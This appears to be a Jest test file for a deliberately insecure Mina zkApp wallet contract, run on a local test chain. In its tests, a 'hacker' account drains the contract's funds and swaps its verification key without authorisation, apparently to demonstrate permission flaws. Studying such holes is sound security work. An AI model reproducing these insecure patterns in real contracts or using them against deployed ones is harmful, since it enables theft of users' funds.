import { WalletUnsecure, ModifiedWalletUnsecure } from './WalletUnsecure';
import {
  Field,
  Mina,
  PrivateKey,
  PublicKey,
  AccountUpdate,
  UInt64,
} from 'snarkyjs';

let proofsEnabled = false;
let enforceTransactionLimits = false;

describe('WalletUnsecure', () => {
  let deployerAccount: PublicKey,
    deployerKey: PrivateKey,
    hackerAccount: PublicKey,
    hackerKey: PrivateKey,
    zkAppAddress: PublicKey,
    zkAppAddress2: PublicKey,
    zkAppPrivateKey: PrivateKey,
    zkApp: WalletUnsecure,
    zkAppPrivateKey2: PrivateKey,
    zkApp2: ModifiedWalletUnsecure;

  const amount: UInt64 = UInt64.from(10);

  beforeAll(async () => {
    if (proofsEnabled) {
      await WalletUnsecure.compile();
      await ModifiedWalletUnsecure.compile();
    }
  });

  beforeEach(() => {
    const Local = Mina.LocalBlockchain({
      proofsEnabled,
      enforceTransactionLimits,
    });
    Mina.setActiveInstance(Local);
    ({ privateKey: deployerKey, publicKey: deployerAccount } =
      Local.testAccounts[0]);
    ({ privateKey: hackerKey, publicKey: hackerAccount } =
      Local.testAccounts[1]);
    zkAppPrivateKey = PrivateKey.random();
    zkAppAddress = zkAppPrivateKey.toPublicKey();
    zkApp = new WalletUnsecure(zkAppAddress);
    zkAppPrivateKey2 = PrivateKey.random();
    zkAppAddress2 = zkAppPrivateKey2.toPublicKey();
    zkApp2 = new ModifiedWalletUnsecure(zkAppAddress2);
  });

  async function localDeploy() {
    const txn = await Mina.transaction(deployerAccount, () => {
      AccountUpdate.fundNewAccount(deployerAccount);
      zkApp.deploy();
    });
    await txn.prove();
    // this tx needs .sign(), because `deploy()` adds an account update that requires signature authorization
    await txn.sign([deployerKey, zkAppPrivateKey]).send();
  }

  it('generates and deploys the `WalletUnsecure` smart contract', async () => {
    await localDeploy();
    const num = zkApp.num.get();
    expect(num).toEqual(Field(1));
  });

  describe('#send', () => {
    it('able to deposit funds to the `WalletUnsecure` smart contract', async () => {
      await localDeploy();

      const deployerBalanceBefore = await Mina.getBalance(deployerAccount);
      const zkAppBalanceBefore = await Mina.getBalance(zkApp.address);
      zkAppBalanceBefore.assertEquals(UInt64.from(0));

      // send Minas to the zkApp
      const txn = await Mina.transaction(deployerAccount, () => {
        let deployer = AccountUpdate.createSigned(deployerAccount);
        deployer.send({ to: zkApp.address, amount: amount });
      });
      await txn.prove();
      await txn.sign([deployerKey]).send();

      const zkAppBalanceAfter = await Mina.getBalance(zkApp.address);
      zkAppBalanceAfter.assertEquals(amount);

      const deployerBalanceAfter = await Mina.getBalance(deployerAccount);
      deployerBalanceAfter.assertEquals(deployerBalanceBefore.sub(amount));
    });
  });

  describe('#withdraw', () => {
    describe('when the contract has funds', () => {
      beforeEach(async () => {
        await localDeploy();

        const deployerBalanceBefore = await Mina.getBalance(deployerAccount);
        const zkAppBalanceBefore = await Mina.getBalance(zkApp.address);
        zkAppBalanceBefore.assertEquals(UInt64.from(0));

        // send Minas to the zkApp
        const txn = await Mina.transaction(deployerAccount, () => {
          let deployer = AccountUpdate.createSigned(deployerAccount);
          deployer.send({ to: zkApp.address, amount: amount });
        });
        await txn.prove();
        await txn.sign([deployerKey]).send();

        const zkAppBalanceAfter = await Mina.getBalance(zkApp.address);
        zkAppBalanceAfter.assertEquals(amount);

        const deployerBalanceAfter = await Mina.getBalance(deployerAccount);
        deployerBalanceAfter.assertEquals(deployerBalanceBefore.sub(amount));
      });
      it('withdraws funds from a contract to hacker', async () => {
        const hackerBalanceBefore = await Mina.getBalance(hackerAccount);

        const withdrawTx = await Mina.transaction(hackerAccount, () => {
          let withdrawal = AccountUpdate.create(zkAppAddress);
          withdrawal.send({ to: hackerAccount, amount: amount });
        });
        await withdrawTx.sign([hackerKey]).send();

        const hackerBalanceAfter = await Mina.getBalance(hackerAccount);
        hackerBalanceAfter.assertEquals(hackerBalanceBefore.add(amount));
      });
    });
  });

  describe('#updateVerificationKey', () => {
    it('updateVerificationKey the `WalletUnsecure` smart contract', async () => {
      await localDeploy();

      let modified = await ModifiedWalletUnsecure.compile();

      // upgrade transaction
      const txn = await Mina.transaction(hackerAccount, () => {
        zkApp.updateVerificationKey(modified.verificationKey);
        AccountUpdate.fundNewAccount(hackerAccount);
        zkApp2.deploy();
      });
      await txn.prove();
      await txn.sign([hackerKey, zkAppPrivateKey2]).send();
    });
    beforeEach(async () => {
      await localDeploy();

      let modified = await ModifiedWalletUnsecure.compile();

      // upgrade transaction
      const txn = await Mina.transaction(hackerAccount, () => {
        zkApp.updateVerificationKey(modified.verificationKey);
        AccountUpdate.fundNewAccount(hackerAccount);
        zkApp2.deploy();
      });
      await txn.prove();
      await txn.sign([hackerKey, zkAppPrivateKey2]).send();
    });
    it('correctly updates the num state on the `ModifiedWalletUnsecure` smart contract', async () => {
      await localDeploy();

      // update transaction
      const txn = await Mina.transaction(hackerAccount, () => {
        zkApp2.update();
      });
      await txn.prove();
      await txn.sign([hackerKey]).send();

      const updatedNum = zkApp.num.get();
      expect(updatedNum).toEqual(Field(3));
    });
  });
});
